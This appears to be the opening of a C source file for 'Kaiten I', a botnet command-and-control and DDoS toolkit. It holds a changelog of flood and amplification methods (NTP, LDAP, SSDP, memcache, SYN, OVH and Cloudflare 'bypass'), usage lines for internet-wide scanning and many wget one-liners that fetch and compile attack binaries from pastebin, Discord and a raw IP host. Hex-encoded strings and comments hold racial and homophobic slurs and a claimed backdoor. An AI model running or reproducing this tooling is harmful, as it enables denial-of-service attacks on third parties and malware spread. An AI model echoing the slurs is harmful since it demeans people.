#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define std_packet 1460


const char *newStr[] = {
    "\x56\x69\x78\x61\x61\x74\x69\x53\x65\x72\x76\x69\x63\x65\x73\x20\x50\x61\x69\x6e\x20\x53\x52\x43\x20\x72\x75\x6e\x73\x20\x79\x6f\x75\x72\x20\x73\x68\x69\x74\x20\x6e\x69\x67\x67\x61\x61\x61\x61\x20\x6c\x6f\x6c\x20\x78\x64\x78\x64\x78\x64\x78\x64\x56\x69\x78\x61\x61\x74\x69\x53\x65\x72\x76\x69\x63\x65\x73\x20\x50\x61\x69\x6e\x20\x53\x52\x43\x20\x72\x75\x6e\x73\x20\x79\x6f\x75\x72\x20\x73\x68\x69\x74\x20\x6e\x69\x67\x67\x61\x61\x61\x61\x20\x6c\x6f\x6c\x20\x78\x64\x78\x64\x78\x64\x78\x64",
    "\x70\x6c\x73\x20\x64\x6f\x6e\x74\x20\x70\x61\x74\x63\x68\x20\x74\x68\x69\x73\x20\x70\x6c\x73\x20\x64\x6f\x6e\x74\x20\x70\x61\x74\x63\x68\x20\x74\x68\x69\x73\x20\x70\x6c\x73\x20\x64\x6f\x6e\x74\x20\x70\x61\x74\x63\x68\x20\x74\x68\x69\x73",
    "\x64\x69\x73\x63\x6f\x72\x64\x20\x64\x6f\x74\x20\x67\x67\x20\x73\x6c\x61\x73\x68\x20\x62\x64\x64\x48\x7a\x47\x67\x4b\x47\x37",
    "VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...",
    "\x6a\x61\x79\x20\x69\x73\x20\x61\x20\x66\x61\x67\x67\x6f\x74",
    "\x61\x64\x64\x20\x69\x6c\x6c\x75\x6d\x69\x6e\x61\x74\x65\x23\x30\x30\x33\x38\x20\x66\x6f\x72\x20\x67\x61\x79\x20\x73\x65\x78"
};
//
//KOMODO WE CODIN THEM LIZARDS ARE BOWLIN
// Hello friend 
// I see you have Kaiten
// Congrats
// Keep in mind
// THIS HAS A BACK DOOR IN
// HAHAHHAHAHAHHAHAHHAHAHA
//
// Now kys pussy nigga
//
// Sell this source for $250
//
// ITS TO GODLY TO LEAK
//
//
//
//
//
//
//
//
//
/*

This Source Will Not Be Released To the public due to it's power
The "DDoS Community" Will abuse this source.

This is to be used ONLY for Cyber-Warfare

Creator: Komodo
Instagram: komodo.sh / funerhal / fr.faygo
Snapchat: kira.komodo
Disocrd: Komodo#0001
Reddit: KomodoLS
Keybase.io: KomodoLS
Twitter: OG_Komodo / __komodo___
Youtube: kxmodo


DESC: NET-WSS
PRJ-VAS: 6949-3853-9891
LSC: GL3.0
OBJ-TYPE: C2 SOURCE X RAW LAYER
STATE: PRIVATE
CIPHER: SHA-512 , AES-BYTE , CIPHER-TLS
CCR: XXX-223-389


╔═════════════════════════╗
║         kaiten I        ║                                 ╔═════════════════════════╗
║           ---           ║                                 ║     Kaiten I : BETA     ║
║          GL3.0          ║                                 ╚═════════════════════════╝
║           839           ║
╚═════════════════════════╝ 

╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║ THIS VERSION WILL 'NOT' BE RELEASED TO THE PUBLIC DUE TO THE REDUNDANT ABUSE FROM THE COMMUNITY USING CYBER CYBER-WARFARE WEAPONS SUCH AS THIS.║                 
║ IF YOU ARE ABLE TO GET 'YOUR' HANDS ON THIS, PLEASE RESPECT THE AUTHORISATION AND WORK THE DEVELOPERS HAVE PUT INTO THIS SOURCE / PROJECT BETA.║                 
╠═════════════════════════════════════════════════════════════════╦══════════════════════════════════════════════════════════════════════════════╣
║  LICENSING :  GNUV3 [GNU GENERAL PUBLIC LICENSE VERSION 3.0]    ║ PROJECT Kaiten IS A C2 SOURCE USING A CHANNEL CONNECTION TO RUN A DISPLAY    ║                                                                         
║  VALID     :  03/23/19                                          ║ SCREEN ON THE CONNECTION STATED VIA THE PORT 'SCREENED' TO. THIS PROJECT     ║                                                                        
║  EXPIRY    :  03/23/22                                          ║ HAS CERTAIN DEPENDENCIES IN ORDER TO PROPERLY COMPLY WITH EACH ADMIN USING   ║                                                                           
║  --                                                             ║ Kaiten. WE ARE IN NO JEOPARDY IF YOU ARE CAUGHT BY ANY MEANS. MEANING ANY    ║                                                                                      
║  STATE     :  PRIVATE                                           ║ TYPE OF AUTHORITY, THIS APPLIES TO POSSESSION AND USAGE OF THIS PROJECT.     ║                                                                        
║  OWNERSHIP :  N/A                                               ║ --                                                                           ║ 
║  NAME      :  Kaiten I                                          ║ THIS PROJECT WAS DESIGNED BOTH FOR ME AND Asian's USAGE ONLY. THIS WORK IS   ║                                                                           
║  --                                                             ║ UNDER 2 COUNTS OF LICENSING. SPECIFICALLY GNU AS WELL AS A PRIVATE PATENTING ║                                                                            
║  CCR       : XXX-223-389                                        ║ UNDER MY OWN DIVISION. NO COVERED WORK SHALL BE DEEMED PART OF AN EFFECTIVE  ║                                                                            
║  CIPHER    : SHA-512 , AES-BYTE , CIPHER-TLS                    ║ TECHNOLOGICAL MEASURE UNDER ANY APPLICABLE LAW FULFILLING OBLIGATIONS UNDER  ║                                                                            
║  GH-ID     : KTN.HID.DDOS                                       ║ ARTICLE 11 OF THE WIPO COPYRIGHT TREATY ADOPTED ON 20 DECEMBER 1996, OR      ║                                                                                
║  --                                                             ║ SIMILAR LAWS PROHIBITING OR RESTRICTING CIRCUMVENTION OF SUCH MEASURES.      ║                                                                        
║  OBJ-TYPE  : C2 SOURCE X TELNET LAYER                           ║ --                                                                           ║  
║  VSSH      : N/A                                                ║ YOU MAY CONVEY A COVERED WORK IN OBJECT CODE FORM UNDER THE TERMS OF SECTIONS║                                                                           
║  OS_TYPE   : CENT_OS [6] - [7]                                  ║ 4 AND 5, PROVIDED THAT YOU ALSO CONVEY THE MACHINE-READABLE CORRESPONDING    ║                                                                          
║  --                                                             ║ SOURCE UNDER THE TERMS OF THIS LICENSE.                                      ║                                       
║  BUILD     : BETA [RELEASE BEFORE VERSION I]                    ║ --                                                                           ║  
║  DESC      : NET-WSS                                            ║                                                                              ║
║  PRJ-VAS   : 6949-3853-9891                                     ║ THIS CODE WAS FOUNDED AND CREATED BY BOTH KOMODO AND STARFALL.               ║                                                                             
║  --        :                                                    ║ WE HAVE THE ENTITLED AND ORIGINAL RIGHTS TO EDIT OR UPGRADE THIS FUNCTIONAL  ║                                                                           
║  --        :                                                    ║ CODE.                                                                        ║              
║  DEV-ALIAS : Komodo / AsianOnDex                                ║                       YOURS TRULY, Komodo And AsianOnDex                     ║                                              
╚═════════════════════════════════════════════════════════════════╩══════════════════════════════════════════════════════════════════════════════╝


                      Another project me and Asian have decided take on after a break of coding project 'Katura'
                      This new project is designed to fulfil the potential of a C2 source, outcompeting other C2 sources.
                      We have decided to try to recreate this source into such a tool where it will completely put
                      'Mirai' RCE-WGET exploitation to complete shame. 

                      This will be a continuous and ongoing project. We are hoping to soon create this into something that
                      exceeds the capabilities that are set by other developers creating such 'cyber-warfare' tools 
                      as this.

                      ---

                      Both me and Asian, Have the certain capabilities to create something so unique and better, through
                      the use of combined networking and programming knowledge.

                      This is a challenge both me and Asian, have decided to take on.

                      Till next time.
                      ___________________________________________________________________________________________________
╔════════╗
║BETA - 1║
╚════════╝ 
Created C2 Base || Process Terminator
Added: AddUserFunction || Added UserAccounts || Added Alternative Chatroom Source || Added Functional Arch Detector (working on it, bc is broken)
Added: Added Portscanner || Added IPGeolocation
Added: Functional Logs, Includes ["IP", "Error", "LogOut", "Shell", "server"]
Added: UserID(s) ||  MD5Format For User Information
=========================
╔════════╗
║BETA - 2║
╚════════╝ 
Managed Bot/Client
Added New Layer4 UDP Methods Including ["STOMP", "HOME", "RAID"]
Added: Arch Detector via ["x86_64", "x86_32", "Arm4", "Arm5", "Arm6", "Arm7", "Mips", "Mipsel", "Sh4", "Ppc", "spc", "M68k", "Arc"]
Added: Distro Detector via ["Ubuntu/Debian", "Gentoo", "REHL/Centos", "Open Suse"]
Added: DevType via ["Python", "python3", "perl"]
Added: Port Detector that dignifies Device Type via ["telnet", "ssh"] etc
=========================
╔════════╗
║BETA - 4║
╚════════╝ 
Added IPHM Implementation > IP-Header Based methods now working. 
Added Methods: ["LDAP", "NTP", "SSDP", "TFTP", "PORTMAP"]
Added New functions, including an external SSH Scanner which uses IPBlocks based by country.
Also added alternative functions for Banning, {We are using IPTables to ban users via IP}
=========================
╔════════╗
║BETA - 5║
╚════════╝ 
Added IPHM Extensions for the following methods: ["LDAP", "SSDP", "NTP", "TFTP", "PORTMAP"]
Added IPHM Scanners for the methods above.
Added process killers for all methods and scanners based over IPHM
Added External Scanner and IPBan system using IPTables
Added SystemDetection Into Client (We are displaying system type) via: ["Linux", "windows", "android"]
Added External Installation Script for IPHM Downloads. includes scanners and attack scripts. command = .install
=========================
╔════════╗
║BETA - 6║
╚════════╝ 
Added: new substrate format for SCKT_V2
Added: a new custom 'LD_KERNEL' preload using a prime buffer size
Added: New Char Injection method using Katura's binary execution system
Added: & Patched all attack output ASCII as well as grammar
Added: NetworkDelimiter, Allows screen to be more stable !
Added: SPECIAL Attacks : ["ZCH-WSS, "STL-BOO", "EFT-PWR", "PMP-PMP"]
Added: New IPHM Based Methods (Yubina Collection); ["prowin", "syn9", "winseqid", "winsyn"]
Added: New Process Killer for ALL IPHM Based methods.
Added: Seperate commands for installing scanners and attack scripts.
Added: New Methods To IPHM Banners, also changed the main menu and added {.iphm};
Added: Seperate Section for scanners. (under Admin menu); Changed command from {.next} to {.scanners}
Fixed: Reply message for all IPHM Based attacks, now showing each method and kill command.
Fixed: all menus, added new options, and changed main menu.
Added: new methods to IPHM Menu: ["rawudp", "rawstd", "ovhbypass", "nfobypass", "cfbypass"]
Added: new process killer for all scanners and scripts. external file: Process_Killer.py
Method OVHBYPASS = xDoS
Method NFOBYPASS = RAWUdp
Method CFBYPASS = CF_BYPASS
Method BO4BYPASS = xts3
=========================
╔════════╗
║BETA - 7║
╚════════╝ 
Additions:
Added: New BW Based methods: ["DOMINATE", "VSE", "TELNET", "TCPABUSE", "UDPABUSE", "DOMINATE", "ESSYN", "CSYN", "ZSYN", "XSYN", "ISSYN"]
Added: New Reflection Based Methods: ["CHARGEN", "SENTINEL", "NETBIOS", "MSSQL", "TS3"]
Added: New Bypass Based Methods: ["XTS3/BO4BYPASS"]
Added: New Process_Killer seperately for Scanners || This is external!
Added: All New Methods to IPHM_Installer || install.py
Added: New Menu for {.iphm} || New methods added!
Added: New Snippets / Attack commands for new methods! || Also added new "Attack.Banners" for new methods.
Added: New methods to Process_Killer
Added: Section for links to all files! (Should be below all of these updates)
Added: Following Linux Distros to DistroDetector in client/bot: ["Fedora", "Redhat", "Arch", "FreeBSD"]
Added: Full section with Installation Logs, Usage Logs, and Compilation Logs for All IPHM Based Methods
Added: new filepaths for all IPHM based files. Location: /root/amp/; all paths listed below the installs.
Added: new filepaths for ALL external based files. paths: scripts="/root/scripts/" C2="/root/c2" BOT="/root/bot/" IPHM="/root/amp/" 
Fixed: Process_Killer For IPHM Based Methods || Now kills ONLY attack processes instead of scanners!
Fixed: Source Size: All menus are now 1 line. lmfao
Fixed: Defined STD_SIZE: Noticed issue inside of client, (I defined the default packet size for STD as 1460) - 
(When using HEX it calls to STD and uses it to send the attack, whilst adding PacketSize for username input) -
(It goes to read the username input for packetsize but it can not be done due to STD Packetsize being defines by default) - 
(commented out std def and added packetsize to HEX) - (Better exp below)
since trim_integer defined the packetsize by default, trim_integer had to change STD up and switch it from (std_size) to (Packetsize) and limited certain methods inside of the pcm to use the 
defined default for packet size giving users the chance to change the packet size to whatever they desire inside of Method: HEX
Changed STD Strings to make attacks more effective
Redefined Default PacketSize for STD - Using for certain methods: Mainly STD alone
Removed: IPHM Based Methods: ["rawudp", "rawstd"] - Replaced with: ["UDPABUSE", "TCPABUSE"]
Removed: First menu for process killer (Wasnt showing on screen and was fucking with the tsc)
Removed: UserID(s) ||  MD5Format For User Information || Update: 1
Removed: UserInfo /UserInformation Menu || Update: 4
Removed: All extra scanner process killer commands > all now in one command < runs IPHM_Scanner_Proces_Killer.py
Removed: DistroDetection for OS's: ["Redhat", "Arch", "FreeBSD", "Fedora"]
Creating method `LOCKDOWN` || This is fucked. 
`LOCKDOWN` Explained: Lockdown Logs all device connections. Connects to those devices, reads connections, spams those servers with connections causing all transmitted_successfully C2's to crash
then kills all connections and removes traces of files, and alternatives. locks the device with a 49 character password, re-roots the device twice and closes the connection.
Created Process_Killer for all IPHM Based Scanners
Created Process_Killer for all IPHM Based Attacks
Created New IPHM Installer for all attack scripts and Scanners
=========================
╔═════════╗
║BETA - 10║
╚═════════╝ 
Added: New IPHM_Scanner_Process_Killer || IPHM_Attack_Process_Killer
Added: Second Page for IPHM Based Attack methods
Added: New methods to the IPHM_Method_Installer || This includes Zachs `custom` methods
Added: New Arch Detection || Arch Display for device type/count
Added: Test Function for new Subdomain/DNS scanner
Added: New `ERROR` Menu for failed logins.
Added: New Load_Banner for the main banner. (Startup) - testing
Added: New scanners inside of the "scanners" menu.
Added: VIP Menu for VIP Users
Added: New banner for Admin/VIP Failure (If the user is not admin and or VIP and they go to use a command meant for those accounts, it will display the new banner)
Added: Port Input for all IPHM Based methods in which allow it
Added: New Logs for ["Compilation_Logs", "Attack_Scripts", "Scanners", "Script_Usages"] || This is for IPHMV2 Menu {.iph2}
Added: Seperate Directories for each file. Explenation below.
Added: New Device Based Methods Via: ["VSE", "SMITE", "HOLD", "HEX", "CRASH", "HOME", "RAID"]
Added: New IPHM Based Methods Via: [" "]
Added: New attack outputs for IPHM Based methods (We are displaying IP, PORT, TIME, METHOD, USAGE, THREADS, PPS)
Added: New attack outputs for Device Based methods.
Added: Manual port input for all IPHM Based Methods || Port input coming soon
Added: All new IPHM Based methods for IPHM Menu v2 {.iph2} || this includes the following: 
Added: New sub-directories for all IPHM-Reflection based methods: files have own directories
Added: New sub-directory file paths for all IPHM-Reflection Based methods
Added: New IPHM Scannable Methods Via: ["dns", "mdns", "db2", "echo", "snmp", "memcache", "rip", "heartbeat]
Added: New IPHM Bandwidth methods (Tcp-collection): ["TCP-AMP", "TCP-RST", "TCP-FIN", "TCP-XMAS", "TCP-ACK"]
Added: New IPHM Bandwidth Methods (Extra Methods III): ["grenade", "zap", "rawudp", "bogus", "wizard"]
Added: New IPHM Bandwidth Methods (Extra Methods VI): ["UDP_VSE", "UDP_VSE2", "EJUNK"]
Added: New IPHM Bandiwdth Methods (Layer7 Methods I): ["OMEGA", "ARME"]
Added: New IPHM Directories for "layer7" and "layer4" methods:
Added: New VIP Section in `.ipm2` / IPHM Menu v2 || These methods are Combos in which use several methods to send attacks to the desired users inputted IP/HOST
Added: Owner accounts (Owner access)
Added: New "CNC" Tool, this allows users to send an `attack` to another cnc causing it to overload. basically just raises the usercount and crashes the screen lol
Fixed: IPHM_Process_Killer's for both `Attack` and `Scanner`
Fixed: Admin Menu. Now only administrators can view this.
Fixed: Attack_Process_Killer || Command was switched to ".killattk" and is now back to its original state as ".kill" lower and CAPS
Removed: SSH/ZONE MassScan || Not Needed (Adding an upgraded version soon)
Updated: the entire main menu
Updated: the entire help menu
Updated: the entire admin menu
Updated: the entire .iphm menu
Updated: all of the defines in beta version 10 > look below (:

Combo Explenation: 
msqdnm = MDNS and MSSQL (GREAT FOR OVH)
tfdnp = TFTP and MDNS (also great for ovh)
lndp = NTP and LDAP 

Small explenation on files and directories.
==================================================
Directories needed:
c2, bot
==================================================
inside of the c2 folder you will need the following folders. || The IPHM_Method_Installation Script should make the `AMP` dir when ran
scripts, logs, amp, 
==================================================
inside of the amp folder you will need the following folders. || The IPHM_Method_Installation Script should make these when ran
methods, lists, scanners
==================================================
inside of the methods folder you will need the following folders. || The IPHM_Method_Installation Script should make these when ran
Bandwidth, Reflection
==================================================
for the (amp) folder, the install.py should set it up on its own and make all of the directories for such on its own.
==================================================
==================================================
Files needed inside of (c2/scripts) folder.
IPHM_Attack_Process_Killer.py, IPHM_Scanner_Process_Killer.py, scan.py

if this helps < here ya go
mkdir c2; mkdir bot; cd c2; mkdir logs; mkdir scripts
==================================================
the "resolver.h" is a C-Header and is included whithin the c2 source itself. THIS IS NEEDED IN ORDER TO COMPILE SAID FILE.
the "IPHM_Method_Installation.py" is the IPHM Script installer, this is needed in the c2 directory. mainly because since we are inside of the c2 dir
we can not push back to run things, and it would make it impossible to run the files off of the c2, so we have to call to the amp/methods/ folder inside of the c2 dir. 
the "arcues.txt" is our login file. should look like this: Komodo's root admin || Input: <Username> <Password> <Level> || levels="admin","normal","vip"
the "IPHM_Attack_Process_Killer.py" is our IPHM Attack Process killer. just makes it easier to kill shit.
the "IPHM_Scanner_Process_Killer.py" is our IPHM Scanner process killer. just makes it easier to kill shit.
the "scan.py" is our SSH Scanner. scans IP Blocks AutoMatically. pretty dank.
NEW:
the "wget.py" is our installation script. this install the process killers, and extra shit we need to kill everything and run smoothly c:
==================================================
Inside of the /c2/amp/methods/reflections/ Directory we are now making directories for all scannable/Reflection Based Methods: the install script does this on its own
==================================================
===================================================
resolver.h - Unsure
iplookupapi.php - Created By Snickers
==================================================
╔═════════════════════════════════════════════════════════╗
║ Kaiten I - Compilation logs - Attack Scripts - Scanners ║
╚═════════════════════════════════════════════════════════╝
# LDAP      - 0 Error Logs - 0 Warning Logs  || Compile Success!  || LDAPSCAN      - 0 Error Logs - 3 Warning Logs  || Compile Success!
# SSDP      - 0 Error Logs - 0 Warning Logs  || Compile Success!  || SSDPScan      - 0 Error Logs - 3 Warning Logs  || Compile Success!
# NTP       - 0 Error Logs - 0 Warning Logs  || Compile Success!  || NTPScan       - 0 Error Logs - 3 Warning Logs  || Compile Success!
# CHARGEN   - 0 Error Logs - 0 Warning Logs  || Compile Success!  || CHARGENSCAN   - 0 Error Logs - 5 Warning Logs  || Compile Success!
# SENTINEL  - 0 Error Logs - 0 Warning Logs  || Compile Success!  || SETNINTELSCAN - 0 Error Logs - 3 Warning Logs  || Compile Success!
# NETBIOS   - 0 Error Logs - 0 Warning Logs  || Compile Success!  || NETBIOSSCAN   - 0 Error Logs - 3 Warning Logs  || Compile Success!
# MSSQL     - 0 Error Logs - 0 Warning Logs  || Compile Success!  || MSSQLSCAN     - 0 Error Logs - 3 Warning Logs  || Compile Success!
# TS3       - 0 Error Logs - 0 Warning Logs  || Compile Success!  || TS3SCAN       - 0 Error Logs - 3 Warning Logs  || Compile Success!
# PORTMAP   - 0 Error Logs - 0 Warning Logs  || Compile Success!  || PORTMAPSCAN   - 1 Error Logs - 0 Warning Logs  || Using New portmap Scanner! Results: 0 Error Logs - 3 Warning Logs || Compile Success!
# TFTP      - 0 Error Logs - 0 Warning Logs  || Compile Success!  || TFTPSCAN      - 1 Error Logs - 3 Warning Logs  || Using New TFTP Scanner!    Results: 1 Error Logs - 3 Warning Logs || Compile Fail ):
# TELNET    - 0 Error Logs - 0 Warning Logs  || Compile Success!
# VSE       - 0 Error Logs - 0 Warning Logs  || Compile Success!
# DOMINATE  - 0 Error Logs - 0 Warning Logs  || Compile Success!
# ZSYN      - 0 Error Logs - 0 Warning Logs  || Compile Success!
# XSYN      - 0 Error Logs - 0 Warning Logs  || Compile Success!
# CSYN      - 0 Error Logs - 0 Warning Logs  || Compile Success!
# ESSYN     - A couple thousand errors.. DO NOT COMPILE, must use as Raw C File and set permissions
# ISSYN     - A couple thousand errors.. DO NOT COMPILE, must use as Raw C File and set permissions
==================================================
╔══════════════════════════════════════════════════════╗
║ Kaiten I - Script Usages - Attack Scripts - Scanners ║
╚══════════════════════════════════════════════════════╝
###############
# Ok, so trim_integer suggest using -1 for all IPHM based methods < pps should = -1
# Also, when scanning, make sure to set the $delay to 1ms || $IPSTART is the beginning IPRange Ex: 0.0.0.0 || $IPEND is the finish_integer IPRange Ex: 255.255.255.255 || This will scan everything!
###############
# LDAP:       ./ldap $IP $PORT $LIST $THREADS $PPS $TIME       || LDAPSCAN:     ./ldapscan $IPSTART $IPEND $LIST $THREADS $DELAY
# SSDP:       ./ssdp $IP $PORT $LIST $THREADS $PPS $TIME       || SSDPSCAN:     ./ssdpscan $IPSTART $IPEND $LIST $THREADS $DELAY
# NTP:        ./ntp $IP $PORT $LIST $THREADS $PPS $TIME        || NTPSCAN:      ./ntpscan $IPSTART $IPEND $LIST $THREADS $DELAY
# CHARGEN:    ./chargen $IP $PORT $LIST $THREADS $PPS $TIME    || CHARGENSCAN:  ./chargenscan $IPSTART $IPEND $LIST $THREADS $DELAY
# SENTINEL:   ./sentinel $IP $PORT $LIST $THREADS $PPS $TIME   || SENTINELSCAN: ./sentinelscan $IPSTART $IPEND $LIST $THREADS $DELAY
# NETBIOS:    ./netbios $IP $PORT $LIST $THREADS $PPS $TIME    || NETBIOSSCAN:  ./netbiosscan $IPSTART $IPEND $LIST $THREADS $DELAY
# MSSQL:      ./mssql $IP $PORT $LIST $THREADS $PPS $TIME      || MSSQLSCAN:    ./mssqlscan $IPSTART $IPEND $LIST $THREADS $DELAY
# TS3:        ./ts3 $IP $PORT $LIST $THREADS $PPS $TIME        || TS3SCAN:      ./ts3scan $IPSTART $IPEND $LIST $THREADS $DELAY
# PORTMAP:    ./portmap $IP $PORT $LIST $THREADS $PPS $TIME    || PORTMAPSCAN:  ./portmapscan $IPSTART $IPEND $LIST $THREADS $DELAY
# TFTP:       ./sentinel $IP $PORT $LIST $THREADS $PPS $TIME   || SENTINELSCAN: its broken :/ ive tried 3 different versions LMFAO
# PROWIN:     ./prowin $IP                                     || Note this attack does not stop on its own, MUST KILL PROCESS!
# WINSYN:     ./winsyn $IP                                     || Note this attack does not stop on its own, MUST KILL PROCESS!
# WINSEQID:   ./winseqid $IP                                   || Note this attack does not stop on its own, MUST KILL PROCESS!
# YUBINA:     ./yubina $IP                                     || Note this attack does not stop on its own, MUST KILL PROCESS!
# OVHBYPASS:  ./ovhbypass $IP $PORT $TIME UDP                  || Source has 2 diffent methods: UDP and HTTP < we are using UDP
# NFOBYPASS:  ./nfobypass $IP $PORT
# CFBYPASS:   php CF_Bypass $URL $LIST $THREADS $TIME          || Needs a proxy list || Url must be http://SITE/ or https://SITE/
# BO4BYPASS:  ./bo4bypass $IP $PORT $PPS $TIME
# VSE:        ./vse $IP $THREADS $PPS $TIME
# DOMINATE:   ./dominate $IP $PORT $THREADS $PPS $TIME
# TELNET:     ./telnet $IP $THREADS $PPS $TIME
# TCP_ABUSE:  ./tcp_abuse $IP $PORT $THREADS $PPS $TIME
# UDP_ABUSE:  ./udp_abuse $IP $PORT $THREADS $PPS $TIME        || SO this method is a server suspended, apparently you can go after ranges this is the optional input: ./udp_abuse $IP $PORT $THREADS $PPS $TIME $STARTIP $ENDIP
# CSYN:       ./csyn $IP $PORT $THREADS $PPS $TIME
# XSYN:       ./xsyn $IP $PORT $THREADS $PPS $TIME
# ZSYN:       ./zsyn $IP $PORT $THREADS $PPS $TIME
# ISSYN:      ./issyn.c $IP $PORT $THREADS $PPS $TIME
# ESSYN:      ./essyn.c $IP $PORT $THREADS $PPS $TIME
==================================================
Installs I:
==================================================
Scannable Methods I:
wget -q https://pastebin.com/raw/cRt6CBpb -O ldap.c && gcc -o ldap ldap.c -pthread
wget -q https://pastebin.com/raw/Yy7MrvmU -O ldapscan.c && gcc -o ldapscan ldapscan.c -pthread
wget -q http://pastebin.com/raw/vpbXuKVA -O ssdp.c; gcc -o ssdp ssdp.c -pthread
wget -q http://pastebin.com/raw/7uNYKs4c -O ssdpscan.c; gcc -o ssdpscan ssdpscan.c -pthread
wget -q http://pastebin.com/raw/PJeYk4Bc -O ntp.c; gcc -o ntp ntp.c -pthread
wget -q http://pastebin.com/raw/XWFfm5hh -O ntpscan.c; gcc -o ntpscan ntpscan.c -pthread
wget -q http://pastebin.com/raw/Kktvq2pz -O chargen.c; gcc -o chargen chargen.c -pthread
wget -q http://pastebin.com/raw/FpeqRp6K -O chargenscan.c; gcc -o chargenscan chargenscan.c -pthread
wget -q http://pastebin.com/raw/jmPdAPPM -O sentinel.c; gcc -o sentinel sentinel.c -pthread
wget -q http://pastebin.com/raw/gX0waM82 -O sentinelscan.c; gcc -o sentinelscan sentinelscan.c -pthread
wget -q http://pastebin.com/raw/D0UFWXmU -O netbios.c; gcc -o netbios netbios.c -pthread
wget -q http://pastebin.com/raw/V6jTyjbi -O netbiosscan.c; gcc -o netbiosscan netbiosscan.c -pthread
wget -q http://pastebin.com/raw/RsYN9wYs -O mssql.c; gcc -o mssql mssql.c -pthread
wget -q http://pastebin.com/raw/3MT59SGE -O mssqlscan.c; gcc -o mssqlscan mssqlscan.c -pthread
wget -q http://pastebin.com/raw/LAb0nSbh -O ts3.c; gcc -o ts3 ts3.c -pthread
wget -q http://pastebin.com/raw/bgraxVGt -O ts3scan.c; gcc -o ts3scan ts3scan.c -pthread
wget -q http://pastebin.com/raw/PNDMd2CF -O portmap.c; gcc -o portmap portmap.c -pthread
wget -q http://pastebin.com/raw/LH6yB0Yt -O portmapscan.c; gcc -o portmapscan portmapscan.c -pthread
wget -q http://pastebin.com/raw/De6amhpb -O tftp.c; gcc -o tftp tftp.c -pthread
wget -q http://pastebin.com/raw/f1TkRk0x -O tftpscan.c; gcc -o tftpscan tftpscan.c -pthread
==================================================
Server Methods I:
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/yubina_collection/Files/prowin -O prowin; chmod 777 prowin
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/yubina_collection/Files/yubina -O yubina; chmod 777 yubina
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/yubina_collection/Files/winseqid -O winseqid; chmod 777 winseqid
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/yubina_collection/Files/winsyn -O winsyn; chmod 777 winsyn
==================================================
Zachs Methods I:

==================================================
Bypass Methods I:
wget -q https://cdn.discordapp.com/attachments/564177458631409694/574420527125364757/xDoS -O ovhbypass; chmod 777 ovhbypass
wget -q https://cdn.discordapp.com/attachments/545653871427715093/574418889484664852/RAWstd -O nfobypass; chmod 777 nfobypass
wget -q https://cdn.discordapp.com/attachments/564177458631409694/575879023440166932/CF_bypass.php -O CF_Bypass
wget -q https://cdn.discordapp.com/attachments/570046106474643486/575885559688462336/xts3 -O bo4bypass; chmod 777 bo4bypass
==================================================
Extra Methods I:
wget -q http://pastebin.com/raw/9v26VXgV -O vse.c; gcc -o vse vse.c -pthread
wget -q http://pastebin.com/raw/y6hAsCMv -O telnet.c; gcc -o telnet telnet.c -pthread
wget -q http://pastebin.com/raw/dR2pEeiq -O dominate.c; gcc -o dominate dominate.c -pthread
wget -q http://98.143.148.177/Archive/reprobate/layer4/Other/tcp_abuse -O tcp_abuse 
wget -q http://98.143.148.177/Archive/reprobate/layer4/Other/udp_abuse -O udp_abuse
==================================================
Extra Methods II:
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/syn_collection/zsyn.c -O zsyn.c; gcc -o zsyn zsyn.c -pthread
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/syn_collection/xsyn.c -O xsyn.c; gcc -o xsyn xsyn.c -pthread
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/syn_collection/csyn.c -O csyn.c; gcc -o csyn csyn.c -pthread
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/syn_collection/essyn.c -O essyn.c; chmod 777 essyn.c
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/syn_collection/issyn.c -O issyn.c; chmod 777 issyn.c
==================================================
╔════════════════════════════════════════════════════════════╗
║ Kaiten I - Compilation logs - Attack Scripts - Scanners v2 ║
╚════════════════════════════════════════════════════════════╝
# DNS:       - 0 Error Logs - 0 Warning Logs  || Compile Success!  || DNSSCAN:      - 1 Error Logs - 0 Warning Logs  || Compile Failed!
# SNMP:      - 0 Error Logs - 0 Warning Logs  || Compile Success!  || SNMPSCAN:     - 0 Error Logs - 3 Warning Logs  || Compile Success!
# DB2:       - 0 Error Logs - 0 Warning Logs  || Compile Success!  || DB2SCAN:      - 0 Error Logs - 3 Warning Logs  || Compile Success!
# ECHO:      - 0 Error Logs - 0 Warning Logs  || Compile Success!  || ECHOSCAN:     - 0 Error Logs - 3 Warning Logs  || Compile Success!
# MDNS:      - 0 Error Logs - 0 Warning Logs  || Compile Success!  || MDNSSCAN:     - 0 Error Logs - 3 Warning Logs  || Compile Success!
# MEMCACHE:  - File is precompiled. set permissions < Finished
# RIP:       - 0 Error Logs - 0 Warning Logs  || Compile Success!  || RIPSCAN:      - 0 Error Logs - 3 Warning Logs  || Compile Success!
# REAPER:    - 0 Error Logs - 0 Warning Logs  || Compile Success!  || REAPERSCAN:   - 0 Error Logs - 3 Warning Logs  || Compile Success!
# HEARTBEAT: - 0 Error Logs - 0 Warning Logs  || Compile Success!  || HEARTBEATSCAN: - 0 Error Logs - 
# GRENADE:   - File is Precompiled. Set Permissions < Finished 
# ZAP:       - 0 Error Logs - 0 Warning Logs  || Compile Success!
# WIZARD:    - 0 Error Logs - 0 Warning Logs  || Compile Success!
